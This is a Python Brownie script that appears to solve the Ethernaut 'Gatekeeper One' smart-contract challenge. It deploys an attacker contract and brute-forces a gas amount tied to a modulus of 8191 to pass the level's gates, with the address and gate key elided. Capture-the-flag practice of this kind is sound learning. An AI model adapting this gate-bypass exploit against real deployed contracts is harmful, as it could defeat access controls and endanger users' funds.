import brownie
from scripts.get_account import get_account
from brownie import web3

EthernautBrownieProject = brownie.project.EthernautBrownieProject

account = get_account()


def gasEstimation():
    challenge_address = '...'

    EthernautBrownieProject.GatekeeperOneAttack.deploy(
        challenge_address,
        {'from': account}
    )
    attacker = EthernautBrownieProject.GatekeeperOneAttack[-1]

    MOD = 8191
    gateKey = '...'

    # estimating gas use
    print('estimating gas use of the attack function')
    for i in range(1000):
        try:
            tx = attacker.attack(
                gateKey, MOD * 100 + i, {'from': account})
        except:
            print('keep trying...')
            continue
        break
    print(f'Success!!! You should use {MOD * 100 + i} gas')


def attack():
    challenge_address = '...'

    EthernautBrownieProject.GatekeeperOneAttack.deploy(
        challenge_address,
        {'from': account}
    )
    attacker = EthernautBrownieProject.GatekeeperOneAttack[-1]
    gasToUse = 819354  # This is from result of gasEstimation function

    gateKey = '...'

    attacker.attack(gateKey, gasToUse, {'from': account})
